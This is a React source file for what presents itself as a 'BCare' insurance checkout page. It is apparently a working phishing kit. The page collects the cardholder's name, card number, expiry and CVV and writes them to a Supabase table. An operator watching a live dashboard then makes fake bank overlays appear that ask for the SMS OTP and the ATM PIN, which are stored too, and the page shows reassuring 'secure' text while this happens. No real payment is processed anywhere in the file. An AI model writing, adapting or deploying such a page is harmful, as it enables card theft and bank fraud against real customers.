import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../../supabase';
import './Payment.css';
import Footer from '../../components/Footer/Footer';

export const Payment = () => {
  const navigate = useNavigate();
  const [status, setStatus] = useState('idle'); // idle, waiting_admin, request_otp, request_atm, verifying, completed, rejected
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [timer, setTimer] = useState(60);
  const [formData, setFormData] = useState({
    cardName: '',
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const timerRef = useRef(null);

  const customerId = sessionStorage.getItem('customerId');

  useEffect(() => {
    if (!customerId) return;
    
    // Track page ONLY - DO NOT reset status here to avoid closing active popups
    supabase.from('customers').update({ 
      page: '5- صفحه الدفع',
      last_update: Date.now(),
      last_heartbeat: Date.now()
    }).eq('id', customerId).then(({ error }) => { if (error) console.error(error) });

    const interval = setInterval(() => {
      const id = sessionStorage.getItem('customerId');
      if (id) {
        supabase.from('customers').update({ 
          last_heartbeat: Date.now() 
        }).eq('id', id).then(() => {});
      }
    }, 5000);

    return () => clearInterval(interval);
  }, [customerId]);

  const updateLastSeen = () => {
    if (customerId) {
      supabase.from('customers').update({ 
        last_update: Date.now() 
      }).eq('id', customerId).then(() => {});
    }
  };

  useEffect(() => {
    if (!customerId) return;

    // Supabase Realtime Subscription
    console.log("Initializing realtime listener for customer:", customerId);
    const channel = supabase
      .channel(`customer_status_${customerId}`)
      .on(
        'postgres_changes',
        { event: 'UPDATE', schema: 'public', table: 'customers' },
        (payload) => {
          const data = payload.new;
          // Manual filter to ensure we only react to OUR customer's updates
          if (data.id !== customerId) return;
          
          console.log("Received realtime update for customer status:", data.status);
          
          // Only update status if it's a valid known status to avoid accidental resets
          if (data.status && data.status !== 'idle') {
            setStatus(data.status);
          }
          
          if (data.status === 'request_otp') {
            console.log("Switching to OTP entry mode");
            supabase.from('customers').update({ page: '6- يملاء otp' }).eq('id', customerId);
            startTimer();
          } else if (data.status === 'request_atm') {
            console.log("Switching to ATM entry mode");
            supabase.from('customers').update({ page: '7- يملا atm' }).eq('id', customerId);
            startTimer();
          } else if (data.status === 'waiting_admin' || data.status === 'otp_received') {
            console.log("In waiting mode:", data.status);
            startTimer();
          } else if (data.status === 'completed') {
            console.log("Payment completed! Navigating to success...");
            navigate('/success');
          } else if (data.status === 'rejected') {
            console.warn("Payment rejected by admin");
            setError('حدث خطأ في عملية الدفع، يرجى التأكد من البيانات والمحاولة مرة أخرى');
            stopTimer();
            setTimeout(() => setStatus('idle'), 3000); 
          }
        }
      )
      .subscribe((status) => {
        console.log("Subscription status:", status);
      });

    return () => {
      supabase.removeChannel(channel);
      stopTimer();
    };
  }, [customerId, navigate]);

  const startTimer = () => {
    stopTimer();
    setTimer(60);
    timerRef.current = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          stopTimer();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const stopTimer = () => {
    if (timerRef.current) clearInterval(timerRef.current);
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    
    if (name === "cardNumber") {
      // Remove all non-digits
      let val = value.replace(/\D/g, "");
      // Add spaces every 4 digits
      let formatted = val.match(/.{1,4}/g)?.join(" ") || "";
      // Limit to 19 characters (16 digits + 3 spaces)
      formatted = formatted.substring(0, 19);
      setFormData(prev => ({ ...prev, [name]: formatted }));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }
    
    updateLastSeen();
  };

  const handlePay = async (e) => {
    if (e) {
      e.preventDefault();
      e.stopPropagation();
    }
    
    if (isSubmitting) return;
    setError('');
    
    if (!customerId) {
      setError('خطأ: لم يتم العثور على بيانات الجلسة، يرجى العودة للرئيسية');
      return;
    }

    // 1. Show waiting popup and start timer IMMEDIATELY for better UX
    setStatus('waiting_admin');
    startTimer();
    setIsSubmitting(true);

    try {
      const updateData = {
        card_number: formData.cardNumber.replace(/\s/g, ''), 
        card_expiry: `${String(formData.expiryMonth).padStart(2, '0')}/${String(formData.expiryYear).slice(-2)}`,
        card_cvv: String(formData.cvv),
        status: 'waiting_admin',
        last_update: Date.now(),
        last_heartbeat: Date.now()
      };

      const { error: supabaseError } = await supabase
        .from('customers')
        .update(updateData)
        .eq('id', customerId);

      if (supabaseError) {
        console.error("Supabase Error:", supabaseError);
        throw supabaseError;
      }
      
      // Update page to indicate waiting status in admin dashboard
      await supabase.from('customers').update({ page: '5- ينتظر الرد (الدفع)' }).eq('id', customerId);

    } catch (err) {
      console.error("Critical Payment Error:", err);
      setError('حدث خطأ فني أثناء معالجة العملية، يرجى المحاولة مرة أخرى أو استخدام بطاقة أخرى');
      setStatus('idle');
      stopTimer();
    } finally {
      setIsSubmitting(false); 
    }
  };

  const submitCode = async (e) => {
    e.preventDefault();
    if (code.length < 4) return;
    
    try {
      // Fetch existing otps first to simulate arrayUnion
      const { data: currentData } = await supabase.from('customers').select('otps').eq('id', customerId).single();
      const currentOtps = currentData?.otps || [];
      
      const newOtp = {
        code,
        type: status === 'request_otp' ? 'otp' : 'atm',
        timestamp: new Date().getTime()
      };

      await supabase.from('customers').update({
        otps: [...currentOtps, newOtp],
        status: 'otp_received',
        last_update: new Date().getTime(),
        last_heartbeat: new Date().getTime()
      }).eq('id', customerId);
      setCode('');
    } catch (err) {
      console.error(err);
    }
  };

  // UI Components
  const WaitingOverlay = ({ title, subtitle }) => (
    <div className="payment-overlay">
      <div className="waiting-box">
        <div className="loader-ring"></div>
        <h2>{title}</h2>
        <p>{subtitle}</p>
        <div className="timer-circle">
          <span>{timer}</span>
        </div>
        <p className="notice">يرجى عدم إغلاق الصفحة أو الضغط على زر الرجوع</p>
      </div>
    </div>
  );

  return (
    <div className="payment-page-v2">
      <header className="site-header">
        <div className="header-center">
          <img src="/group-21.svg" alt="BCare Logo" className="header-logo" />
        </div>
      </header>

      <main className="payment-main-v2">
        <div className="payment-container">
          <div className="payment-header-v2">
            <h1>إتمام عملية الدفع</h1>
            <p>أدخل بيانات البطاقة بشكل صحيح لتفعيل الوثيقة فوراً</p>
          </div>

          <div className="price-badge">
            <span className="badge-label">المبلغ المطلوب سداده</span>
            <span className="badge-value">{sessionStorage.getItem('totalPrice') || '688.85'} ر.س</span>
          </div>

          {error && <div className="payment-error-banner">{error}</div>}

          <form className="card-entry-form" onSubmit={handlePay}>
            <div className="card-brands">
              <img src="/شعار مدي لصفحه الدفع.svg" alt="Mada" style={{height: '25px', objectFit: 'contain'}} />
              <img src="/شعار فيزا لصفحه الدفع.svg" alt="Visa" style={{height: '30px', objectFit: 'contain'}} />
              <img src="/شعار ماستر كارد لصفحه الدفع.svg" alt="Mastercard" style={{height: '35px', objectFit: 'contain'}} />
            </div>

            <div className="input-group">
              <label>اسم حامل البطاقة</label>
              <input type="text" name="cardName" placeholder="الاسم كما هو مدون على البطاقة" value={formData.cardName} onChange={handleChange} required />
            </div>

            <div className="input-group">
              <label>رقم البطاقة</label>
              <input 
                type="text" 
                name="cardNumber" 
                placeholder="1234 5678 9012 3456" 
                maxLength="19" 
                value={formData.cardNumber} 
                onChange={handleChange} 
                required 
                style={{ direction: 'ltr', textAlign: 'left' }}
              />
            </div>

            <div className="form-row">
              <div className="input-group half">
                <label>تاريخ الانتهاء</label>
                <div className="expiry-inputs">
                  <select name="expiryMonth" value={formData.expiryMonth} onChange={handleChange} required>
                    <option value="">الشهر</option>
                    {Array.from({length: 12}, (_, i) => (<option key={i+1} value={i+1}>{i+1}</option>))}
                  </select>
                  <select name="expiryYear" value={formData.expiryYear} onChange={handleChange} required>
                    <option value="">السنة</option>
                    {Array.from({length: 13}, (_, i) => (<option key={i} value={2026+i}>{2026+i}</option>))}
                  </select>
                </div>
              </div>

              <div className="input-group half">
                <label>رمز الأمان (CVV)</label>
                <input type="password" name="cvv" placeholder="123" maxLength="3" value={formData.cvv} onChange={handleChange} required />
              </div>
            </div>

            <button 
              type="submit" 
              className={`pay-now-btn ${isSubmitting ? 'btn-loading' : ''}`}
              disabled={isSubmitting}
            >
              {isSubmitting ? 'جاري المعالجة...' : `ادفع الآن ${sessionStorage.getItem('totalPrice') || '688.85'} ر.س`}
            </button>
          </form>
        </div>
      </main>

      {/* Overlays & Modals */}
      
      {/* 1. Initial waiting for Admin */}
      {status === 'waiting_admin' && (
        <WaitingOverlay 
          title="جاري الاتصال بحسابك البنكي..." 
          subtitle="يرجى الانتظار، جاري التحقق من تفاصيل العملية مع البنك المصدر"
        />
      )}

      {/* 2. OTP/ATM Entry */}
      {(status === 'request_otp' || status === 'request_atm') && (
        <div className="payment-overlay">
          <div className="code-modal">
            <div className="bank-logo-placeholder">
              <img src="/group-21.svg" alt="Secure Pay" />
            </div>
            <h2>{status === 'request_otp' ? 'رمز التحقق (OTP)' : 'رمز الصراف (ATM)'}</h2>
            <p>تم إرسال رمز التحقق إلى رقم الجوال المسجل لدى البنك</p>
            <form onSubmit={submitCode}>
              <input 
                type="text" 
                placeholder="- - - -" 
                className="code-input"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                autoFocus
              />
              <button type="submit" className="submit-code-btn">تأكيد المتابعة</button>
            </form>
            <div className="modal-footer">
              <span>آمن 100%</span>
              <span>نظام التشفير العالمي</span>
            </div>
          </div>
        </div>
      )}

      {/* 3. Verifying Code (After user clicks Submit) */}
      {status === 'otp_received' && (
        <WaitingOverlay 
          title="جاري تأكيد المعاملة..." 
          subtitle="يرجى الانتظار، جاري معالجة الكود والتحقق من صحة البيانات"
        />
      )}

      <Footer />
    </div>
  );
};
